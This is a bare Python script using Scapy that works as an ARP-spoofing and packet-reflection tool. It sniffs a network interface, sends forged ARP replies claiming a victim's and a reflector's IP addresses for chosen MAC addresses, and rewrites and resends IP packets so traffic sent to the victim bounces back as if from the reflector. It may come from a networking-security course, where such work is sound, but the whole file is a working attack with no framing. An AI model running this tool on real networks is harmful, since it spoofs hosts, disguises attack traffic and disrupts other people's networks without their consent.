#!/usr/bin/env python3
from scapy.all import *

victimIpAddress = ''
victimMacAddress = ''
reflectorIpAddress = ''
reflectorMacAddress = ''
interface = ''


def sendArpResponse(packet):
    if packet[ARP].pdst != victimIpAddress and packet[ARP].pdst != reflectorIpAddress:
        return
    arpVictimPacket = ARP(psrc = victimIpAddress, pdst = packet[ARP].psrc, op=ARP.is_at, hwsrc = victimMacAddress, hwdst='ff:ff:ff:ff:ff:ff')
    send(arpVictimPacket)
    arpReflectorPacket = ARP(psrc = reflectorIpAddress, pdst = packet[ARP].psrc, op=ARP.is_at, hwsrc = reflectorMacAddress, hwdst='ff:ff:ff:ff:ff:ff')
    send(arpReflectorPacket)


def sendIPResponse(packet):
    ip_packet = packet.getlayer(IP)
    if packet[IP].dst == victimIpAddress:
        arp_packet = ARP(psrc = reflectorIpAddress, pdst = packet[IP].src ,op = 1)
        send(arp_packet)
        ip_packet[IP].dst, ip_packet[IP].src = packet[IP].src, reflectorIpAddress
        del ip_packet[IP].chksum
        if TCP in ip_packet:
            del ip_packet[TCP].chksum
        if UDP in ip_packet:
            del ip_packet[UDP].chksum
        send(ip_packet)
    if packet[IP].dst == reflectorIpAddress:
        arp_packet = ARP(psrc=victimIpAddress, pdst=packet[IP].src, op=1)
        send(arp_packet)
        ip_packet[IP].dst, ip_packet[IP].src = packet[IP].src, victimIpAddress
        del ip_packet[IP].chksum
        if TCP in ip_packet:
            del ip_packet[TCP].chksum
        if UDP in ip_packet:
            del ip_packet[UDP].chksum
        send(ip_packet)


def call_back(packet):
    if ARP in packet:
        sendArpResponse(packet)
    if IP in packet:
        sendIPResponse(packet)


def main():
    sniff(iface=interface, prn=call_back, store=0, count=0)


if __name__ == "__main__":
    parameters = {}
    for i in range(0, 5):
        parameters[sys.argv[2*i+1]] = sys.argv[2*i+2]
    print(parameters)
    victimIpAddress = parameters['--victim-ip']
    victimMacAddress = parameters['--victim-ethernet']
    reflectorIpAddress = parameters['--reflector-ip']
    reflectorMacAddress = parameters['--reflector-ethernet']
    interface = parameters['--interface']
    main()
